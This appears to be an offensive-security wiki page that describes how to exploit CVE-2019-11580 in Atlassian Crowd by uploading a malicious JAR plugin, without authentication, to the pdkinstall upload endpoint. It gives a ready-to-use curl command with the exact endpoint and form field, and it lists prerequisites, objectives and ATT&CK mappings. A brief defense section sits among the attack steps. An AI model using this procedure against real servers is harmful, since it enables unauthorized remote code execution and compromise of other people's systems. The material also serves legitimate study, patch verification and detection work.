---
tags:
  - rce
  - plugin-upload
  - cve-2019-11580
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-upload-malicious-plugin]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2024-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Upload Malware]]'
updated_at: '2025-12-14T17:23:24.851Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e7c41300-6926-4c13-8ed8-777d493a8e58
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Upload Malware]]'
---
# Upload-Malicious-Plugin-to-Crowd

## Summary

This procedure uploads a malicious JAR plugin to an Atlassian Crowd instance via the vulnerable /crowd/admin/uploadplugin.action endpoint, exploiting the enabled pdkinstall development plugin for unauthenticated installation leading to RCE.

## Description

CVE-2019-11580 stems from pdkinstall being active in release builds, allowing arbitrary plugin uploads without authentication. The procedure uses curl to send the rce.jar as multipart form data, installing it in Tomcat's temp directory. This targets web-facing Crowd servers on Linux, with impact including root RCE for command execution, file reads, and network pivoting. Prerequisites: Prepared rce.jar and network access to the endpoint.

## Requirements

1. rce.jar in current directory
2. Network connectivity to https://target/crowd/admin/uploadplugin.action
3. Curl installed on attacker's Linux machine

## Defense

Defensive measures and detection strategies:

- Disable pdkinstall plugin in production Crowd instances
- Implement authentication on admin endpoints and monitor for multipart uploads
- Log and alert on plugin installations via /uploadplugin.action

## Objectives

1. Install malicious plugin without authentication
2. Place JAR in Tomcat temp for servlet activation
3. Enable subsequent RCE via plugin endpoint

## Instructions

### Step 1: Upload JAR Using Curl

**Context**: POST the rce.jar to the vulnerable endpoint with insecure SSL and multipart content-type to bypass checks and install the plugin.

**Command** ([[commands/curl-upload-malicious-plugin]]):

```bash
curl -k -H "Content-Type: multipart/content" --form "file_cdl=@rce.jar;type=application/octet-stream" https://target/crowd/admin/uploadplugin.action
```

> The -k flag skips SSL verification, the header sets multipart type, and --form uploads rce.jar as 'file_cdl'. Expected output: Success message or redirect indicating installation at /opt/atlassian/crowd/apache-tomcat/temp/plugindev-XXXXrce.jar.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Upload Malware]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-malicious-plugin]]

## Tools Used

- [[tools/curl]]

## Tags

- rce
- plugin-upload
